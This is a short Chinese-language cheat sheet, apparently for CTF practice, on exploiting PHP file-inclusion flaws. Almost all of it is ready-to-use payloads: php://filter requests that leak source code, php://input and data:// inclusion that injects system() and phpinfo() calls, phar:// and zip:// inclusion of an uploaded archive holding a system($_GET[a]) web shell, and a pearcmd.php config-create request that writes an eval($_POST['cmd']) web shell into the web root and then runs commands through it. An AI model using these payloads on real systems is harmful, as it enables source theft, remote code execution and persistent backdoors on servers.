allow_url_include=off默认关闭，开发者使用文件包含往往会开启
allow_url_fopen=on默认开启，一般不用管
<https://blog.csdn.net/weixin_44508748/article/details/108162951>

^
php伪协议 文件包含读本地php文件源代码
```
include php://filter/read=convert.base64-encode/resource=flag.php

包含返回flag.php文件源码字符串的是base64编码内容
进行一次base64解码即可看到源代码

如果是根据名称匹配包含php文件
只需要把名称参数换成php://filter/read=convert.base64-encode/resource=flag即可。

也可中间加个index等字符也可以。
php://filter/read=convert.base64-encode/index/resource=flag
```

^
php伪协议 文件包含注入php的php代码
```
1. 自动包含POST请求体:(需要第一allow_url_include开启)
include php://input
post请求的请求体参数xx=<?php system(); ?>
请求体直接就一个<?php system(); ?>也可。

2. 直接包含代码内容:(需要两个allow开启)
include data://text/plain,<?php phpinfo(); ?>



file_get_contents('data://text/plain,welcome to the zjctf','r')
即为welcome to the zjctf
```


^
php伪协议 文件包含自动解压文件再包含
```
phar://D:/phpinfo.zip/phpinfo.txt
zip://D:\\phpinfo.jpg%23phpinfo.txt

上传了个压缩包，压缩包中phpinfo.txt中文件为<?php system($_GET[a]); ?>
```


## **pearcmd.php文件包含**
已知文件包含：include $_GET['c'].".php";
裸文件包含, 没有上传点, 可供尝试的只有pearcmd.php上传木马。
先用
```
GET /index.php?+config-create+/&c=pearcmd&/<?=@eval($_POST['cmd']);?>+/var/www/html/test.php HTTP/1.1
```
在/var/www/html下写入webshell
再
```
POST /test.php HTTP/1.1

Content-Type: application/x-www-form-urlencoded
Content-Length: 26

cmd=system("cat 36d.php");
```
也可<https://www.cnblogs.com/Egcrying/p/17665041.html>
